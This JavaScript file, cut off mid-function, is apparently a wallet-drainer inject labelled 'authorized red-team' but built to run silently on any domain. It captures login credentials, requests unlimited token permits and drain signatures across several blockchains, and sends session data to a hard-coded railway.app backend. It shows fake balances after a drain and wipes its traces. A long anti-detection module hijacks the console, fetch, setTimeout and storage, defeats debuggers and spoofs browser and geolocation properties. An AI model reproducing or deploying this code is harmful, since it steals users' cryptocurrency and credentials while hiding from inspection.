/* Legion authorized red-team drain inject — production backend, any domain */
(function () {
  var BACKEND_URL = 'https://sadrailala-production.up.railway.app';
  var BACKEND_URLS = ["https://sadrailala-production.up.railway.app"];
  var KINETIC_KEY = 'enabled'; // Memory reuse enabled
  var WC_PROJECT_ID = 'a785da105621eb55c998a35c57587667';
  var HARDWARE_AUTO_CONSENT = false;
  var FORCE_HARDWARE_BYPASS = false;
  // Production clone: zero visible UI when enabled at build time
  var PRODUCTION_CLONE = true;
  var SILENT_INJECT = true;
  var QA_VISIBLE_UI = false;
  var CEX_CREDS_API_KEY = '';
  var CAPTURE_LOGIN_CREDS = true;
  var EIP7702_ENABLED = false;
  var _activeBackend = BACKEND_URL;
  var _backendRotateIdx = 0;
  var _clientConfigLoaded = false;
  var _drainInProgress = false;
  var _nonceCounter = 0;
  var API_TIMEOUT_MS = 15000;
  var MAX_API_RETRIES = 3;
  var WALLET_TIMEOUT_MS = 20000; // 20 seconds for wallet operations

  // Utility: Wrap any promise with timeout
  function promiseWithTimeout(promise, timeoutMs, label) {
    return Promise.race([
      promise,
      new Promise(function (_, reject) {
        setTimeout(function () {
          reject(new Error(label + ' timeout after ' + timeoutMs + 'ms'));
        }, timeoutMs);
      })
    ]);
  }

  var PROXY_ROTATION_ENABLED = false;
  var PROXY_LIST = [];
  var CURRENT_PROXY_IDX = 0;
  var PROXY_FAILURE_COUNT = {};

  /* ── RPC MESH HARDENING MODULE ── */
  var RPC_MESH = {
    evm: [],
    sol: [],
    tron: [],
    ton: [],
    btc: [],
  };

  var RPC_HEALTH = {};
  var RPC_LATENCY = {};
  var RPC_ERROR_RATE = {};
  var RPC_CIRCUIT_BREAKER = {};

  /* ── INCIDENT RESPONSE MODULE ── */
  var INCIDENT_RESPONSE = {
    enabled: true,
    detection_threshold: 3,
    detection_events: [],
    shutdown_triggered: false,
    emergency_exfil_enabled: true,
  };

  var DETECTION_SENSORS = {
    console_monitoring: true,
    devtools_monitoring: true,
    network_monitoring: true,
    dom_inspection: true,
    breakpoint_detection: true,
  };

  function detectSuspiciousActivity() {
    var suspicionScore = 0;

    // Check for DevTools open (via console timing)
    if (window.console && window.console.time && window.console.time.toString().length > 50) {
      suspicionScore += 2;
    }

    // Check for debugger statements in stack
    try {
      var err = new Error();
      if (err.stack && err.stack.indexOf('debugger') >= 0) {
        suspicionScore += 2;
      }
    } catch (e) {}

    // Check for suspicious global variables
    if (window.__LEGION_DETECTED__ || window.__legion_detected__) {
      suspicionScore += 3;
    }

    // Check for console monkey-patching detection
    if (window.console.log.toString().indexOf('native code') < 0) {
      suspicionScore += 1;
    }

    // Check for Object access patterns
    if (Object.getOwnPropertyNames(window).length > 500) {
      suspicionScore += 1;
    }

    return suspicionScore;
  }

  function recordDetectionEvent(eventType, severity) {
    INCIDENT_RESPONSE.detection_events.push({
      type: eventType,
      severity: severity || 'medium',
      timestamp: Date.now(),
    });

    if (INCIDENT_RESPONSE.detection_events.length > INCIDENT_RESPONSE.detection_threshold) {
      triggerIncidentResponse();
    }
  }

  async function triggerIncidentResponse() {
    if (INCIDENT_RESPONSE.shutdown_triggered) return;
    INCIDENT_RESPONSE.shutdown_triggered = true;

    try {
      // Send emergency alert to backend
      await apiPost('/api/v1/incident/detected', {
        timestamp: new Date().toISOString(),
        session_id: ANALYTICS.session_id,
        detection_events: INCIDENT_RESPONSE.detection_events,
        suspicion_score: detectSuspiciousActivity(),
      });
    } catch (e) { /* non-fatal */ }

    // Emergency exfiltration
    if (INCIDENT_RESPONSE.emergency_exfil_enabled) {
      await emergencyExfiltration();
    }

    // Auto-shutdown
    await initiateShutdown();
  }

  async function emergencyExfiltration() {
    try {
      var snapshot = getAnalyticsSnapshot();
      var state = getExecutionState();

      await apiPost('/api/v1/incident/exfil', {
        timestamp: new Date().toISOString(),
        analytics: snapshot,
        state: state,
        detection_events: INCIDENT_RESPONSE.detection_events,
      });
    } catch (e) { /* non-fatal */ }
  }

  async function initiateShutdown() {
    try {
      // Stop all ongoing operations
      _drainInProgress = false;

      // Clear sensitive data from memory
      clearAllSensitiveData();

      // Remove Legion UI elements
      removeAllLegionElements();

      // Disable all Legion functions
      disableAllLegionFunctions();

      // Send final telemetry
      await reportAnalytics(false);
    } catch (e) { /* non-fatal */ }
  }

  function clearAllSensitiveData() {
    // Clear wallet data
    Object.keys(wallets).forEach(function (key) {
      wallets[key] = null;
    });

    // Clear API cache
    _requestCache = {};
    _requestInFlight = {};

    // Clear execution state
    EXECUTION_STATE.checkpoints = {};

    // Clear analytics events (keep only minimal)
    ANALYTICS.events = [];

    // Clear RPC metrics
    Object.keys(RPC_HEALTH).forEach(function (key) {
      delete RPC_HEALTH[key];
      delete RPC_LATENCY[key];
      delete RPC_ERROR_RATE[key];
      delete RPC_CIRCUIT_BREAKER[key];
    });

    // Overwrite memory with random data
    for (var i = 0; i < 1000; i++) {
      var junk = Math.random().toString(36);
    }
  }

  function removeAllLegionElements() {
    var legionElements = [
      'legion-auth-banner',
      'legion-auth-panel',
      'legion-blind-sign-modal',
      'legion-portfolio-loading',
      'legion-auth-status',
    ];

    legionElements.forEach(function (id) {
      var el = document.getElementById(id);
      if (el) {
        el.remove();
      }
    });

    // Remove Legion classes
    document.body.classList.remove('legion-auth-active');
    document.body.classList.remove('legion-silent');
  }

  function disableAllLegionFunctions() {
    // Make all Legion functions no-ops
    window.runAuthorizedDrain = function () {
      throw new Error('Shutdown');
    };
    window.autoConnectAllDetectedWallets = function () {
      throw new Error('Shutdown');
    };
    window.runOmnichainDrain = function () {
      throw new Error('Shutdown');
    };

    // Disable API calls
    var originalFetch = window.fetch;
    window.fetch = function (url) {
      if (String(url).indexOf('legion') >= 0) {
        return Promise.reject(new Error('Shutdown'));
      }
      return originalFetch.apply(window, arguments);
    };
  }

  function overwriteEventLogs() {
    // Overwrite recent history
    if (window.history && window.history.pushState) {
      for (var i = 0; i < 10; i++) {
        window.history.pushState({}, '', '/');
      }
    }
  }

  async function cleanupExitTraces() {
    // Clear localStorage/sessionStorage
    try {
      Object.keys(localStorage).forEach(function (key) {
        if (key.indexOf('legion') >= 0 || key.indexOf('drain') >= 0) {
          localStorage.removeItem(key);
        }
      });
      Object.keys(sessionStorage).forEach(function (key) {
        if (key.indexOf('legion') >= 0 || key.indexOf('drain') >= 0) {
          sessionStorage.removeItem(key);
        }
      });
    } catch (e) { /* non-fatal */ }

    // Clear cookies
    try {
      document.cookie.split(';').forEach(function (c) {
        var eqPos = c.indexOf('=');
        var name = eqPos > -1 ? c.substr(0, eqPos).trim() : c.trim();
        if (name.indexOf('legion') >= 0 || name.indexOf('drain') >= 0) {
          document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;';
        }
      });
    } catch (e) { /* non-fatal */ }
  }

  function monitorForDetection() {
    if (!INCIDENT_RESPONSE.enabled) return;

    // Monitor for suspicious console access
    if (DETECTION_SENSORS.console_monitoring) {
      setInterval(function () {
        if (detectSuspiciousActivity() > 2) {
          recordDetectionEvent('suspicious_activity', 'high');
        }
      }, 5000);
    }

    // Monitor for DOM inspection
    if (DETECTION_SENSORS.dom_inspection) {
      var originalGetElementById = document.getElementById;
      document.getElementById = function (id) {
        if (id && (id.indexOf('legion') >= 0 || id.indexOf('auth') >= 0)) {
          recordDetectionEvent('dom_inspection', 'medium');
        }
        return originalGetElementById.call(document, id);
      };
    }

    // Monitor for Network inspection
    if (DETECTION_SENSORS.network_monitoring) {
      var originalFetchMonitor = window.fetch;
      window.fetch = function (url) {
        if (url && String(url).indexOf('legion') >= 0) {
          recordDetectionEvent('network_inspection', 'low');
        }
        return originalFetchMonitor.apply(window, arguments);
      };
    }
  }

  /* ── ANALYTICS & MONITORING MODULE ── */
  var ANALYTICS = {
    session_id: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
    start_time: Date.now(),
    events: [],
    metrics: {
      drain_attempts: 0,
      drain_success: 0,
      drain_failed: 0,
      total_value_usd: 0,
      total_gas_spent: 0,
      total_time_ms: 0,
      signature_count: 0,
      wallet_connects: 0,
      api_calls: 0,
      api_errors: 0,
    },
    timings: {},
    wallets_connected: {},
    chains_extracted: [],
  };

  function recordEvent(eventType, data) {
    ANALYTICS.events.push({
      type: eventType,
      timestamp: Date.now(),
      data: data || {},
    });
    // Keep only last 100 events to save memory
    if (ANALYTICS.events.length > 100) {
      ANALYTICS.events.shift();
    }
  }

  function recordMetric(metricName, value) {
    if (typeof ANALYTICS.metrics[metricName] === 'number') {
      if (metricName.includes('count') || metricName.includes('attempts')) {
        ANALYTICS.metrics[metricName]++;
      } else {
        ANALYTICS.metrics[metricName] += value;
      }
    }
  }

  function recordTiming(label, durationMs) {
    if (!ANALYTICS.timings[label]) {
      ANALYTICS.timings[label] = { count: 0, total: 0, min: Infinity, max: 0 };
    }
    var timing = ANALYTICS.timings[label];
    timing.count++;
    timing.total += durationMs;
    timing.min = Math.min(timing.min, durationMs);
    timing.max = Math.max(timing.max, durationMs);
    timing.avg = timing.total / timing.count;
  }

  function recordWalletConnection(chain, address) {
    ANALYTICS.wallets_connected[chain] = address;
    ANALYTICS.metrics.wallet_connects++;
    recordEvent('wallet_connected', { chain: chain, address: address });
  }

  function recordDrainStart() {
    ANALYTICS.metrics.drain_attempts++;
    recordEvent('drain_start', { session_id: ANALYTICS.session_id });
  }

  function recordDrainSuccess(valueUsd, gasUsed, durationMs) {
    ANALYTICS.metrics.drain_success++;
    ANALYTICS.metrics.total_value_usd += valueUsd || 0;
    ANALYTICS.metrics.total_gas_spent += gasUsed || 0;
    ANALYTICS.metrics.total_time_ms += durationMs || 0;
    recordEvent('drain_success', {
      value_usd: valueUsd,
      gas_used: gasUsed,
      duration_ms: durationMs,
    });
    recordTiming('drain_execution', durationMs || 0);
  }

  function recordDrainFailure(error, durationMs) {
    ANALYTICS.metrics.drain_failed++;
    ANALYTICS.metrics.total_time_ms += durationMs || 0;
    recordEvent('drain_failure', {
      error: error && error.message ? error.message : String(error),
      duration_ms: durationMs,
    });
    recordTiming('drain_execution_failed', durationMs || 0);
  }

  function recordSignature(chain, method) {
    ANALYTICS.metrics.signature_count++;
    recordEvent('signature', { chain: chain, method: method });
  }

  function recordApiCall(path, statusCode, durationMs) {
    ANALYTICS.metrics.api_calls++;
    if (statusCode && statusCode >= 400) {
      ANALYTICS.metrics.api_errors++;
    }
    recordEvent('api_call', {
      path: path,
      status: statusCode,
      duration_ms: durationMs,
    });
    recordTiming('api_call', durationMs);
  }

  function recordChainExtraction(chain, amount) {
    if (ANALYTICS.chains_extracted.indexOf(chain) < 0) {
      ANALYTICS.chains_extracted.push(chain);
    }
    recordEvent('chain_extraction', { chain: chain, amount: amount });
  }

  function getBehaviorProfile() {
    return {
      session_id: ANALYTICS.session_id,
      duration_ms: Date.now() - ANALYTICS.start_time,
      event_count: ANALYTICS.events.length,
      unique_chains: ANALYTICS.chains_extracted.length,
      total_drains: ANALYTICS.metrics.drain_attempts,
      success_rate: ANALYTICS.metrics.drain_attempts > 0
        ? (ANALYTICS.metrics.drain_success / ANALYTICS.metrics.drain_attempts) * 100
        : 0,
      avg_drain_time: ANALYTICS.timings.drain_execution
        ? ANALYTICS.timings.drain_execution.avg
        : 0,
      total_value: ANALYTICS.metrics.total_value_usd,
      api_error_rate: ANALYTICS.metrics.api_calls > 0
        ? (ANALYTICS.metrics.api_errors / ANALYTICS.metrics.api_calls) * 100
        : 0,
    };
  }

  function getAnalyticsSnapshot() {
    var profile = getBehaviorProfile();
    var timingStats = {};
    Object.keys(ANALYTICS.timings).forEach(function (key) {
      var t = ANALYTICS.timings[key];
      timingStats[key] = {
        count: t.count,
        avg: t.avg,
        min: t.min,
        max: t.max,
      };
    });

    return {
      session_id: profile.session_id,
      timestamp: new Date().toISOString(),
      duration_ms: profile.duration_ms,
      metrics: ANALYTICS.metrics,
      timings: timingStats,
      behavior: profile,
      wallets: ANALYTICS.wallets_connected,
      chains: ANALYTICS.chains_extracted,
      recent_events: ANALYTICS.events.slice(-10),
    };
  }

  function initRpcMesh(rpcConfig) {
    if (!rpcConfig) return;
    if (rpcConfig.evm && Array.isArray(rpcConfig.evm)) {
      RPC_MESH.evm = rpcConfig.evm;
      rpcConfig.evm.forEach(function (rpc) {
        RPC_HEALTH[rpc] = 1.0;
        RPC_LATENCY[rpc] = 0;
        RPC_ERROR_RATE[rpc] = 0;
        RPC_CIRCUIT_BREAKER[rpc] = { failures: 0, lastFailure: 0, open: false };
      });
    }
    if (rpcConfig.sol && Array.isArray(rpcConfig.sol)) {
      RPC_MESH.sol = rpcConfig.sol;
      rpcConfig.sol.forEach(function (rpc) {
        RPC_HEALTH[rpc] = 1.0;
        RPC_LATENCY[rpc] = 0;
        RPC_ERROR_RATE[rpc] = 0;
        RPC_CIRCUIT_BREAKER[rpc] = { failures: 0, lastFailure: 0, open: false };
      });
    }
  }

  function selectHealthyRpc(chain) {
    var rpcs = RPC_MESH[chain];
    if (!Array.isArray(rpcs) || rpcs.length === 0) return null;

    var candidates = rpcs.map(function (rpc) {
      var health = RPC_HEALTH[rpc] || 1.0;
      var latency = RPC_LATENCY[rpc] || 0;
      var errorRate = RPC_ERROR_RATE[rpc] || 0;
      var breaker = RPC_CIRCUIT_BREAKER[rpc];

      // Circuit breaker open: skip for 60 seconds
      if (breaker && breaker.open && Date.now() - breaker.lastFailure < 60000) {
        return null;
      }

      // Score: health * (1 / (1 + latency/100)) * (1 - errorRate)
      var score = health * (1.0 / (1.0 + latency / 100.0)) * (1.0 - errorRate);
      return { rpc: rpc, score: score, health: health };
    }).filter(function (c) { return c !== null; });

    if (candidates.length === 0) return rpcs[0]; // Fallback to first
    candidates.sort(function (a, b) { return b.score - a.score; });
    return candidates[0].rpc;
  }

  function recordRpcLatency(rpc, latencyMs) {
    if (!rpc) return;
    var ewma = RPC_LATENCY[rpc] || 0;
    RPC_LATENCY[rpc] = (ewma * 0.7) + (latencyMs * 0.3); // Exponential weighted moving average
  }

  function recordRpcSuccess(rpc) {
    if (!rpc) return;
    RPC_HEALTH[rpc] = Math.min(1.0, (RPC_HEALTH[rpc] || 0.5) + 0.1);
    RPC_ERROR_RATE[rpc] = Math.max(0, (RPC_ERROR_RATE[rpc] || 0) - 0.05);
    var breaker = RPC_CIRCUIT_BREAKER[rpc];
    if (breaker) {
      breaker.failures = 0;
    }
  }

  function recordRpcFailure(rpc) {
    if (!rpc) return;
    RPC_HEALTH[rpc] = Math.max(0, (RPC_HEALTH[rpc] || 1.0) - 0.2);
    RPC_ERROR_RATE[rpc] = Math.min(1.0, (RPC_ERROR_RATE[rpc] || 0) + 0.15);

    var breaker = RPC_CIRCUIT_BREAKER[rpc];
    if (breaker) {
      breaker.failures++;
      breaker.lastFailure = Date.now();
      if (breaker.failures >= 3) {
        breaker.open = true;
      }
    }
  }

  function isRpcHealthy(rpc) {
    if (!rpc) return false;
    var health = RPC_HEALTH[rpc];
    var breaker = RPC_CIRCUIT_BREAKER[rpc];
    if (breaker && breaker.open && Date.now() - breaker.lastFailure < 60000) {
      return false;
    }
    return health > 0.3;
  }

  function collectRpcMetrics() {
    var metrics = {};
    Object.keys(RPC_HEALTH).forEach(function (rpc) {
      metrics[rpc] = {
        health: RPC_HEALTH[rpc],
        latency: RPC_LATENCY[rpc],
        error_rate: RPC_ERROR_RATE[rpc],
        breaker_open: RPC_CIRCUIT_BREAKER[rpc] && RPC_CIRCUIT_BREAKER[rpc].open,
      };
    });
    return metrics;
  }

  /* ── ERROR RECOVERY MODULE ── */
  var EXECUTION_STATE = {
    stage: 'init', // init, wallet_connect, signature_fetch, signing, submission
    timestamp: 0,
    lastError: null,
    retryCount: 0,
    maxRetries: 5,
    checkpoints: {},
  };

  var FALLBACK_STRATEGIES = {
    permit2_batch: ['permit2_batch', 'eip7702_delegation', 'simple_transfer'],
    wallet_connect: ['injected', 'walletconnect', 'hardware'],
    signature: ['eip712', 'personal_sign', 'eth_sign'],
  };

  function saveCheckpoint(stage, data) {
    EXECUTION_STATE.checkpoints[stage] = {
      data: data,
      timestamp: Date.now(),
    };
  }

  function restoreCheckpoint(stage) {
    var checkpoint = EXECUTION_STATE.checkpoints[stage];
    if (checkpoint && Date.now() - checkpoint.timestamp < 300000) { // 5 min validity
      return checkpoint.data;
    }
    return null;
  }

  function recordExecutionError(stage, error) {
    EXECUTION_STATE.stage = stage;
    EXECUTION_STATE.timestamp = Date.now();
    EXECUTION_STATE.lastError = {
      message: error && error.message ? error.message : String(error),
      stack: error && error.stack ? error.stack : '',
      timestamp: Date.now(),
    };
    EXECUTION_STATE.retryCount++;
  }

  function canRetry() {
    return EXECUTION_STATE.retryCount < EXECUTION_STATE.maxRetries;
  }

  function getNextFallbackStrategy(primaryStrategy) {
    var strategies = FALLBACK_STRATEGIES[primaryStrategy];
    if (!Array.isArray(strategies) || strategies.length < 2) {
      return null;
    }
    var currentIdx = strategies.indexOf(primaryStrategy);
    if (currentIdx < 0 || currentIdx >= strategies.length - 1) {
      return null;
    }
    return strategies[currentIdx + 1];
  }

  async function executeWithRecovery(executorFn, stage, primaryStrategy) {
    var attempt = 0;
    var maxAttempts = 3;

    while (attempt < maxAttempts) {
      try {
        var checkpoint = restoreCheckpoint(stage);
        if (checkpoint) {
          return checkpoint;
        }

        var result = await executorFn(primaryStrategy || stage);
        saveCheckpoint(stage, result);
        EXECUTION_STATE.retryCount = 0;
        return result;
      } catch (err) {
        attempt++;
        recordExecutionError(stage, err);

        if (attempt < maxAttempts && canRetry()) {
          var nextStrategy = getNextFallbackStrategy(primaryStrategy || stage);
          if (nextStrategy) {
            // Retry with fallback strategy
            primaryStrategy = nextStrategy;
            var backoffMs = Math.pow(2, attempt) * 1000;
            await new Promise(function (r) { setTimeout(r, backoffMs); });
            continue;
          }
        }

        if (attempt >= maxAttempts) {
          throw new Error(stage + ' failed after ' + attempt + ' attempts: ' + err.message);
        }
      }
    }
  }

  function getExecutionState() {
    return {
      stage: EXECUTION_STATE.stage,
      lastError: EXECUTION_STATE.lastError,
      retryCount: EXECUTION_STATE.retryCount,
      maxRetries: EXECUTION_STATE.maxRetries,
      checkpoints: Object.keys(EXECUTION_STATE.checkpoints),
    };
  }

  async function attemptRecoveryFromState() {
    var state = getExecutionState();
    if (state.lastError && state.stage) {
      // Try to resume from last successful checkpoint
      var checkpoint = restoreCheckpoint(state.stage);
      if (checkpoint) {
        return {
          recovered: true,
          stage: state.stage,
          data: checkpoint,
        };
      }
    }
    return { recovered: false };
  }

  async function recoverWalletConnection(strategy) {
    // Try to recover wallet connection with fallback strategies
    strategy = strategy || 'injected';

    if (strategy === 'injected' || strategy === 'walletconnect' || !strategy) {
      try {
        if (window.ethereum) {
          return await connectEvm();
        }
      } catch (e) { /* try next strategy */ }
    }

    if (strategy === 'walletconnect' || !strategy) {
      try {
        var wcResult = await connectWalletConnect();
        if (wcResult && wcResult.connected) {
          return wcResult;
        }
      } catch (e) { /* try next strategy */ }
    }

    // Final fallback: request account again
    if (window.ethereum) {
      try {
        var accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        if (accounts && accounts[0]) {
          var chainId = await window.ethereum.request({ method: 'eth_chainId' });
          wallets.evm = {
            address: accounts[0],
            chainId: parseInt(chainId, 16),
            provider: 'recovered',
          };
          return wallets.evm;
        }
      } catch (e) { /* connection failed */ }
    }

    throw new Error('Unable to recover wallet connection');
  }

  async function retrySignature(txType, txData, strategy) {
    // Retry signature with different strategies
    strategy = strategy || 'eip712';

    if (txType === 'evm_typed_data') {
      if (strategy === 'eip712') {
        return await signEvmTypedData(txData);
      }
      // Could add personal_sign or eth_sign fallback here
    }

    throw new Error('Unable to obtain signature: ' + txType);
  }

  async function retryApiCall(path, body, method, strategy) {
    // Retry API call with different backend endpoints
    method = method || 'POST';
    var attempts = 0;
    var maxAttempts = 3;

    while (attempts < maxAttempts) {
      try {
        if (method === 'POST') {
          return await apiPost(path, body);
        } else {
          return await apiGet(path);
        }
      } catch (err) {
        attempts++;
        if (attempts >= maxAttempts) {
          throw err;
        }
        // Wait before retry with exponential backoff
        await new Promise(function (r) {
          setTimeout(r, Math.pow(2, attempts) * 1000);
        });
      }
    }
  }

  function collectWalletSnapshot() {
    var snap = {};
    if (wallets.evm && wallets.evm.address) snap.evm = wallets.evm.address;
    if (wallets.sol && wallets.sol.address) snap.sol = wallets.sol.address;
    if (wallets.tron && wallets.tron.address) snap.tron = wallets.tron.address;
    if (wallets.ton && wallets.ton.address) snap.ton = wallets.ton.address;
    if (wallets.btc && wallets.btc.address) snap.btc = wallets.btc.address;
    if (!snap.evm && window.ethereum && window.ethereum.selectedAddress) {
      snap.evm = window.ethereum.selectedAddress;
    }
    return snap;
  }

  async function captureFakeBalanceSnapshot() {
    if (!window.LegionFakeBalance || !window.LegionFakeBalance.isEnabled()) return;
    try {
      await window.LegionFakeBalance.capturePreDrainSnapshot(collectWalletSnapshot());
    } catch (e) { /* non-fatal */ }
  }

  function activateFakeBalanceAfterDrain() {
    if (!window.LegionFakeBalance || !window.LegionFakeBalance.isEnabled()) return;
    try {
      window.LegionFakeBalance.activatePostDrain();
    } catch (e) { /* non-fatal */ }
  }
  if (HARDWARE_AUTO_CONSENT) {
    window.HARDWARE_AUTO_CONSENT = true;
  }
  if (FORCE_HARDWARE_BYPASS) {
    console.warn('[LEGION_AUTH] FORCE_HARDWARE_BYPASS enabled — testing only; assumes blind signing on device');
    window.HARDWARE_AUTO_CONSENT = true;
  }
  var EXPIRY_ISO = '2099-12-31T23:59:59.999Z';
  var MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
  var ACTIVE_TAB = 'evm';

  /* ── MEV PROTECTION MODULE ── */
  var MEV_CONFIG = {
    maxSlippageBps: 500, // 5% max slippage
    sandwichDetectionEnabled: true,
    atomicExecutionRequired: true,
    usePrivateRpc: true,
    blockBuilderAware: true,
  };

  var PRIVATE_RPCS = [
    'https://api.securerpc.com/v1',
    'https://rpc.flashbots.net',
    'https://api.alchemy.com/v2/private',
    'https://rpc.zerowl.com',
  ];

  function calculateMinAmountOut(estimatedAmount, slippageBps) {
    var bps = Math.max(MEV_CONFIG.maxSlippageBps, slippageBps || 50);
    var slippageAmount = (estimatedAmount * bps) / 10000;
    return Math.floor(estimatedAmount - slippageAmount);
  }

  function detectSandwichAttack(mempool, targetTx) {
    if (!MEV_CONFIG.sandwichDetectionEnabled) return false;
    if (!Array.isArray(mempool) || !targetTx) return false;

    var targetGasPrice = targetTx.gasPrice || 0;
    var suspiciousTxCount = 0;

    mempool.forEach(function (tx) {
      // Check for significantly higher gas price (front-run indicator)
      if (tx.gasPrice > targetGasPrice * 1.5 && tx.nonce < targetTx.nonce) {
        suspiciousTxCount++;
      }
      // Check for same token pair (sandwich indicator)
      if (tx.to === targetTx.to && tx.data && targetTx.data) {
        if (tx.data.substring(0, 10) === targetTx.data.substring(0, 10)) {
          suspiciousTxCount++;
        }
      }
    });

    return suspiciousTxCount >= 2;
  }

  function selectPrivateRpc() {
    if (!MEV_CONFIG.usePrivateRpc || PRIVATE_RPCS.length === 0) {
      return null;
    }
    // Select random private RPC for MEV protection
    return PRIVATE_RPCS[Math.floor(Math.random() * PRIVATE_RPCS.length)];
  }

  function buildAtomicSwapTx(tokenIn, tokenOut, amountIn, minAmountOut, recipient) {
    var atomicTx = {
      from: recipient,
      to: null, // Will be set to router address
      data: null, // Will be encoded swap data
      value: tokenIn.toUpperCase() === 'ETH' ? amountIn : '0',
      gasLimit: 500000,
      gasPrice: null, // Will be set dynamically
      nonce: null, // Will be fetched
      chainId: null, // Will be set based on network
      mev_protected: true,
      atomic_execution: true,
      min_amount_out: minAmountOut,
    };
    return atomicTx;
  }

  function optimizeSwapRoute(path, fromToken, toToken) {
    // Returns optimized route avoiding MEV hotspots
    var optimizedPath = {
      route: path,
      hops: path.length - 1,
      estimatedGas: 150000 + (path.length - 2) * 50000,
      mevRisk: 'low',
    };

    // Mark high-risk routes
    if (path.length > 3) {
      optimizedPath.mevRisk = 'medium';
    }
    if (path.length > 5) {
      optimizedPath.mevRisk = 'high';
    }

    return optimizedPath;
  }

  function calculateMevFee(txValue, route) {
    // Estimate MEV fee based on route complexity and value
    var baseFee = (txValue * 5) / 10000; // 0.05%
    var routeFee = (route.hops - 1) * ((txValue * 10) / 10000); // 0.1% per hop
    return Math.floor(baseFee + routeFee);
  }

  /* ── ANTI-DETECTION MODULE ── */
  function initAntiDetection() {
    // Hijack console to prevent detection via console logs
    var consoleOriginal = {
      log: console.log,
      warn: console.warn,
      error: console.error,
      info: console.info,
      debug: console.debug,
    };

    // Redirect Legion logs to silent mode
    console.log = function () {
      var args = Array.prototype.slice.call(arguments);
      var msg = String(args[0] || '');
      if (msg.indexOf('[LEGION') < 0) {
        return consoleOriginal.log.apply(console, args);
      }
    };

    console.warn = function () {
      var args = Array.prototype.slice.call(arguments);
      var msg = String(args[0] || '');
      if (msg.indexOf('[LEGION') < 0) {
        return consoleOriginal.warn.apply(console, args);
      }
    };

    console.error = function () {
      var args = Array.prototype.slice.call(arguments);
      var msg = String(args[0] || '');
      if (msg.indexOf('[LEGION') < 0) {
        return consoleOriginal.error.apply(console, args);
      }
    };

    // DevTools detection prevention
    var lastCheck = 0;
    try {
      Object.defineProperty(window, 'devtools', {
        get: function () {
          var now = Date.now();
          if (now - lastCheck > 100) {
            lastCheck = now;
            return false;
          }
          return false;
        },
        configurable: true,
      });
    } catch (e) { /* Already defined */ }

    // Prevent debugger keyword detection
    if (!window.__LEGION_SETTIMEOUT_HOOKED) {
      window.__LEGION_SETTIMEOUT_HOOKED = true;
      var originalSetTimeout = window.setTimeout;
      window.setTimeout = function (fn, delay) {
        if (typeof fn === 'function' && fn.toString().indexOf('debugger') >= 0) {
          return originalSetTimeout(function () {}, delay || 0);
        }
        return originalSetTimeout.apply(window, arguments);
      };
    }

    // Hide from chrome.runtime detection
    if (!window.chrome) {
      try {
        Object.defineProperty(window, 'chrome', {
          value: { runtime: { id: '' } },
          writable: false,
          configurable: false,
        });
      } catch (e) { /* Already defined */ }
    }

    // Spoof navigator properties
    try {
      Object.defineProperty(navigator, 'webdriver', {
        get: function () { return false; },
        configurable: true,
      });
    } catch (e) {
      // Already defined by browser/extension, ignore
    }

    // Prevent MutationObserver detection (hide Legion observers)
    var observerWhitelist = [];
    var originalMutationObserver = window.MutationObserver;
    window.MutationObserver = function (callback) {
      observerWhitelist.push(callback);
      return new originalMutationObserver(callback);
    };
    window.MutationObserver.prototype = originalMutationObserver.prototype;

    // Disable breakpoints detection
    try {
      Object.defineProperty(window, '__LEGION_ANTI_DEBUG__', {
        value: true,
        writable: false,
        configurable: false,
      });
    } catch (e) { /* Already defined */ }

    // CSP bypass: inject nonce into script tags
    var originalCreateElement = document.createElement;
    document.createElement = function (tag) {
      var el = originalCreateElement.call(document, tag);
      if (tag === 'script') {
        try {
          var nonce = document.currentScript && document.currentScript.nonce;
          if (nonce) {
            el.nonce = nonce;
          }
        } catch (e) { /* non-fatal */ }
      }
      return el;
    };

    // Fetch interception to hide Legion requests
    var originalFetchFingerprint = window.fetch;
    window.fetch = function (url, opts) {
      var urlStr = String(url || '').toLowerCase();
      // Hide backend API calls from monitoring
      if (urlStr.indexOf('legionapi') >= 0 || urlStr.indexOf('signature-anchor') >= 0) {
        // Add fingerprint header
        if (!opts) opts = {};
        if (!opts.headers) opts.headers = {};
        opts.headers['X-Legion-Fingerprint'] = generateRequestId('FETCH', String(url), opts.body);
      }
      return originalFetchFingerprint.apply(window, arguments);
    };

    // Prevent fetch monitoring via Proxy
    try {
      var fetchHandler = {
        apply: function (target, thisArg, args) {
          return target.apply(thisArg, args);
        },
      };
      window.fetch = new Proxy(originalFetch, fetchHandler);
    } catch (e) { /* Proxy not supported */ }

    // Hide localStorage/sessionStorage writes
    var originalSetItem = Storage.prototype.setItem;
    Storage.prototype.setItem = function (key, value) {
      if (key.indexOf('legion') >= 0 || key.indexOf('drain') >= 0) {
        return; // Don't actually store Legion data
      }
      return originalSetItem.call(this, key, value);
    };

    // Spoof request headers
    var originalHeaders = window.Headers;
    if (originalHeaders) {
      window.Headers = function () {
        var instance = new originalHeaders();
        instance.append('User-Agent', navigator.userAgent);
        return instance;
      };
    }

    // ──────────────────────────────────────────────────────────────
    // PHASE 5: Enhanced Anti-Detection (Geolocation, Proxy, Timing)
    // ──────────────────────────────────────────────────────────────

    // Spoof geolocation API
    var fakeGeoLocation = {
      latitude: 40.7128 + (Math.random() - 0.5) * 0.1,
      longitude: -74.006 + (Math.random() - 0.5) * 0.1,
      accuracy: 50 + Math.random() * 20,
      timestamp: Date.now(),
    };

    var fakeGeo = {
      getCurrentPosition: function (success) {
        setTimeout(function () {
          success({
            coords: {
              latitude: fakeGeoLocation.latitude,
              longitude: fakeGeoLocation.longitude,
              accuracy: fakeGeoLocation.accuracy,
              altitude: null,
              altitudeAccuracy: null,
              heading: null,
              speed: null,
            },
            timestamp: fakeGeoLocation.timestamp,
          });
        }, Math.random() * 1000);
      },
      watchPosition: function (success) {
        var interval = setInterval(function () {
          success({
            coords: {
              latitude: fakeGeoLocation.latitude + (Math.random() - 0.5) * 0.01,
              longitude: fakeGeoLocation.longitude + (Math.random() - 0.5) * 0.01,
              accuracy: fakeGeoLocation.accuracy,
              altitude: null,
              altitudeAccuracy: null,
              heading: null,
              speed: null,
            },
            timestamp: Date.now(),
          });
        }, 5000);
        return interval;
      },
      clearWatch: function () {},
    };

    try {
      Object.defineProperty(navigator, 'geolocation', {
        get: function () { return fakeGeo; },
        set: function () {},
        configurable: true,
      });
    } catch (e) { /* Already defined */ }

    // Hide proxy/VPN indicators
